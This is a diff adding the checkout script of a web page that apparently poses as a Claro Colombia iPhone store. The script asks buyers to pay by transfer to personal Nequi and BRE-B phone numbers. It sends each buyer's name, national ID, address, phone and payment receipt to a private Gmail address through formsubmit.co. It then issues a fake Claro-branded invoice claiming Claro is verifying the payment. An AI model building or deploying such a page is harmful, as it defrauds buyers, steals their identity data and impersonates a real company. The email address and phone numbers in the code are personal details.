+            document.querySelectorAll('.main-image').forEach(img=>{ img.addEventListener('click',()=>{ let arr = JSON.parse(img.dataset.full); showLightbox(arr,0); }); }); 
+            document.querySelectorAll('.thumbnail').forEach(th=>{ th.addEventListener('click',function(e){ let container=this.closest('.gallery-container'); let main=container.querySelector('.main-image'); main.src=this.dataset.img; container.querySelectorAll('.thumbnail').forEach(t=>t.classList.remove('active')); this.classList.add('active'); }); }); 
+        }
+        let lightboxImages=[], lightboxIndex=0;
+        function showLightbox(imgs,idx){ lightboxImages=imgs; lightboxIndex=idx; let modal=document.createElement('div'); modal.className='modal-base active'; modal.style.zIndex='3000'; modal.innerHTML=`<div style="background:transparent; text-align:center;"><img src="${imgs[idx]}" style="max-width:90vw; max-height:80vh; border-radius:32px; box-shadow:0 20px 40px rgba(0,0,0,0.3);"><div style="display:flex; justify-content:center; gap:20px; margin-top:20px;"><button id="lbPrev" style="background:white; border:none; border-radius:50%; width:44px; font-size:1.6rem;">◀</button><button id="lbNext" style="background:white; border:none; border-radius:50%; width:44px; font-size:1.6rem;">▶</button><button id="lbClose" style="background:white; border:none; border-radius:50%; width:44px;">✖</button></div></div>`; document.body.appendChild(modal); let close=()=>modal.remove(); document.getElementById('lbClose')?.addEventListener('click',close); document.getElementById('lbPrev')?.addEventListener('click',()=>{ lightboxIndex=(lightboxIndex-1+lightboxImages.length)%lightboxImages.length; modal.querySelector('img').src=lightboxImages[lightboxIndex]; }); document.getElementById('lbNext')?.addEventListener('click',()=>{ lightboxIndex=(lightboxIndex+1)%lightboxImages.length; modal.querySelector('img').src=lightboxImages[lightboxIndex]; }); }
+        renderProducts();
+        document.getElementById('searchInput').addEventListener('input',e=>renderProducts(e.target.value));
+
+        // MODALES BÁSICOS
+        document.getElementById('promoModal').classList.add('active');
+        document.getElementById('closePromoBtn').onclick=()=>document.getElementById('promoModal').classList.remove('active');
+        document.getElementById('acceptPromoBtn').onclick=()=>document.getElementById('promoModal').classList.remove('active');
+        document.getElementById('closeGiftBtn').onclick=()=>{document.getElementById('giftModal').classList.remove('active'); pendingProduct=null;};
+        document.getElementById('openPolicyBtn').onclick=()=>document.getElementById('policyModal').classList.add('active');
+        document.getElementById('closePolicyBtn').onclick=()=>document.getElementById('policyModal').classList.remove('active');
+
+        // DRAWER
+        let drawer=document.getElementById('cartDrawer'), overlay=document.getElementById('cartOverlay');
+        document.getElementById('cartFloating').addEventListener('click',()=>{drawer.classList.add('open'); overlay.classList.add('active');});
+        document.getElementById('closeDrawerBtn').addEventListener('click',()=>{drawer.classList.remove('open'); overlay.classList.remove('active');});
+        overlay.addEventListener('click',()=>{drawer.classList.remove('open'); overlay.classList.remove('active');});
+
+        // CHECKOUT
+        const checkoutModal=document.getElementById('checkoutModal');
+        const checkoutBtnDrawer=document.getElementById('checkoutFromDrawer');
+        function openCheckout(){ if(cart.length===0){showToast('Carrito vacío');return;} checkoutModal.classList.add('active'); updateBreakdown(); }
+        checkoutBtnDrawer.addEventListener('click',openCheckout);
+        document.getElementById('closeCheckoutBtn').onclick=()=>checkoutModal.classList.remove('active');
+        const nequiCard=document.getElementById('nequiCard'), brebCard=document.getElementById('brebCard');
+        const nequiPanel=document.getElementById('nequiPanel'), brebPanel=document.getElementById('brebPanel');
+        nequiCard.onclick=()=>{nequiCard.classList.add('selected'); brebCard.classList.remove('selected'); nequiPanel.style.display='block'; brebPanel.style.display='none';};
+        brebCard.onclick=()=>{brebCard.classList.add('selected'); nequiCard.classList.remove('selected'); nequiPanel.style.display='none'; brebPanel.style.display='block';};
+        document.getElementById('copyNequiBtn').onclick=()=>{navigator.clipboard.writeText('3202112323'); showToast('Nequi copiado');};
+        document.getElementById('copyBrebBtn').onclick=()=>{navigator.clipboard.writeText('@3138237540'); showToast('BRE-B copiado');};
+        function updateBreakdown(){ let total=getCartTotal(); let isPartial=document.querySelector('input[name="payMode"]:checked').value==='partial'; let box=document.getElementById('breakdownBox'); if(isPartial){ let advance=Math.round(total*0.3); let balance=total-advance; box.innerHTML=`<div><strong>Total pedido:</strong> ${formatCOP(total)}</div><div style="color:#c0392b;">💰 Pagas hoy (30%): ${formatCOP(advance)}</div><div>🚚 Pagas contra entrega: ${formatCOP(balance)}</div>`; }else{ box.innerHTML=`<div><strong>✅ Total a pagar ahora:</strong> ${formatCOP(total)}</div>`; } }
+        document.querySelectorAll('input[name="payMode"]').forEach(r=>r.addEventListener('change',updateBreakdown));
+
+        // FACTURA PDF
+        async function generateInvoicePDF(customerData, cartItems, total, isPartial, paidAmount, balanceDue, platform, modalidadText) {
+            const { jsPDF } = window.jspdf;
+            const doc = new jsPDF();
+            const logoImg = await new Promise(resolve => { const img = new Image(); img.crossOrigin = "Anonymous"; img.src = LOGO_URL; img.onload = () => resolve(img); img.onerror = () => resolve(null); });
+            doc.setFillColor(227,24,55); doc.rect(0,0,210,45,'F');
+            if(logoImg) { const imgWidth=35; const imgHeight=(logoImg.height*imgWidth)/logoImg.width; doc.addImage(logoImg,'PNG',15,8,imgWidth,imgHeight); }
+            else { doc.setTextColor(255,255,255); doc.setFontSize(22); doc.text('CLARO COLOMBIA',20,22); }
+            doc.setFontSize(12); doc.setTextColor(255,255,255); doc.text('Factura Electrónica - iPhone Store',20,35);
+            doc.setFontSize(10); doc.text(`Fecha: ${new Date().toLocaleString()}`,140,15); doc.text(`Factura N°: CL-${Math.floor(Math.random()*1000000)}`,140,25);
+            doc.setTextColor(0,0,0); doc.setFontSize(11); doc.setFont('helvetica','bold'); doc.text('DATOS DEL CLIENTE',20,60);
+            doc.setFont('helvetica','normal'); doc.setFontSize(10);
+            doc.text(`Nombre: ${customerData.Nombre}`,20,70); doc.text(`Cédula: ${customerData.Cedula}`,20,78);
+            doc.text(`Ciudad: ${customerData.Ciudad} / Dir: ${customerData.Direccion}`,20,86);
+            doc.text(`Teléfono: ${customerData.Telefono}`,20,94); if(customerData.Observaciones) doc.text(`Observaciones: ${customerData.Observaciones}`,20,102);
+            const tableBody = cartItems.map(i => [i.name, i.quantity, i.price===0?'Gratis':formatCOP(i.price), i.price===0?'$0':formatCOP(i.price*i.quantity)]);
+            doc.autoTable({ startY:110, head:[['Producto','Cantidad','Precio Unit.','Subtotal']], body:tableBody, theme:'striped', headStyles:{ fillColor:[227,24,55], textColor:255 }, margin:{ left:20, right:20 } });
+            let finalY = doc.lastAutoTable.finalY+10;
+            doc.setFontSize(12); doc.setFont('helvetica','bold'); doc.text(`TOTAL DEL PEDIDO: ${formatCOP(total)}`,20,finalY);
+            doc.setFontSize(10); doc.setFont('helvetica','normal'); doc.text(`Método de pago: ${platform} - ${modalidadText}`,20,finalY+8);
+            if(isPartial) { doc.text(`Anticipo pagado hoy: ${formatCOP(paidAmount)}`,20,finalY+16); doc.text(`Saldo pendiente contra entrega: ${balanceDue}`,20,finalY+24); }
+            else { doc.text(`Total pagado: ${formatCOP(paidAmount)}`,20,finalY+16); }
+            doc.setTextColor(200,0,0); doc.setFontSize(11); doc.setFont('helvetica','bold'); doc.text('⚠️ Pago realizado y en proceso de verificación por Claro Colombia ⚠️',20,finalY+34);
+            doc.setFontSize(9); doc.setTextColor(150,0,0); doc.text('Este comprobante será validado en un plazo máximo de 24 horas.',20,finalY+42);
+            doc.save(`factura_claro_${Date.now()}.pdf`);
+            showToast('Factura PDF descargada automáticamente.');
+        }
+
+        // FORMULARIO FINAL
+        const formFinal=document.getElementById('finalOrderForm');
+        const fakeFile=document.getElementById('fakeFileLabel');
+        const realFile=document.getElementById('proofFileInput');
+        fakeFile.addEventListener('click',()=>realFile.click());
+        realFile.addEventListener('change',()=>{if(realFile.files.length) fakeFile.innerHTML=`<i class="fas fa-check"></i> ${realFile.files[0].name}`; else fakeFile.innerHTML='<i class="fas fa-cloud-upload-alt"></i> Adjuntar comprobante';});
+        formFinal.addEventListener('submit',async(e)=>{
+            e.preventDefault();
+            let nombre=formFinal.querySelector('input[name="Nombre"]').value.trim();
+            let cedula=formFinal.querySelector('input[name="Cedula"]').value.trim();
+            let ciudad=formFinal.querySelector('input[name="Ciudad"]').value.trim();
+            let direccion=formFinal.querySelector('input[name="Direccion"]').value.trim();
+            let telefono=formFinal.querySelector('input[name="Telefono"]').value.trim();
+            let observaciones=formFinal.querySelector('textarea').value.trim();
+            if(!nombre||!cedula||!ciudad||!direccion||!telefono) return showToast('Complete todos los campos obligatorios');
+            if(!realFile.files.length) return showToast('Adjunte comprobante de pago');
+            if(cart.length===0) return showToast('Carrito vacío');
+            let total=getCartTotal();
+            let isPartial=document.querySelector('input[name="payMode"]:checked').value==='partial';
+            let paidAmount=isPartial?Math.round(total*0.3):total;
+            let balanceDue=isPartial?formatCOP(total-paidAmount):'0';
+            let platform=nequiPanel.style.display!=='none'?'Nequi':'BRE-B';
+            let modalidadText=isPartial?'Contra entrega (30% anticipo)':'Pago total';
+            const fd=new FormData();
+            fd.append('Nombre',nombre); fd.append('Cedula',cedula); fd.append('Ciudad',ciudad); fd.append('Direccion',direccion); fd.append('Telefono',telefono);
+            fd.append('Observaciones',observaciones);
+            fd.append('comprobante',realFile.files[0]);
+            fd.append('Metodo',platform); fd.append('Modalidad',modalidadText); fd.append('Total pagado',paidAmount); fd.append('Saldo pendiente',balanceDue);
+            fd.append('_subject','NUEVO PEDIDO iPhone Claro Colombia');
+            fd.append('_captcha','false');
+            let btn=document.getElementById('submitOrderFinal');
+            let original=btn.innerHTML;
+            btn.innerHTML='<i class="fas fa-spinner fa-pulse"></i> Enviando...';
+            try{
+                let res=await fetch('https://formsubmit.co/justincortez1621@gmail.com',{method:'POST',body:fd});
+                if(res.ok){
+                    const customerData = { Nombre: nombre, Cedula: cedula, Ciudad: ciudad, Direccion: direccion, Telefono: telefono, Observaciones: observaciones };
+                    await generateInvoicePDF(customerData, cart, total, isPartial, paidAmount, balanceDue, platform, modalidadText);
+                    showToast('✅ Pedido enviado. Factura descargada');
+                    clearCart(); formFinal.reset(); realFile.value=''; fakeFile.innerHTML='<i class="fas fa-cloud-upload-alt"></i> Adjuntar comprobante';
+                    checkoutModal.classList.remove('active'); drawer.classList.remove('open'); overlay.classList.remove('active');
+                } else showToast('Error al enviar, intenta de nuevo');
+            }catch(err){ showToast('Error de conexión'); }
+            finally{ btn.innerHTML=original; }
+        });
+
+        if(localStorage.getItem('claro_cart')){ let saved=JSON.parse(localStorage.getItem('claro_cart')); if(saved.length) { cart=saved; updateCartUI(); } }
+    })();
+</script>
+</body>
+</html>
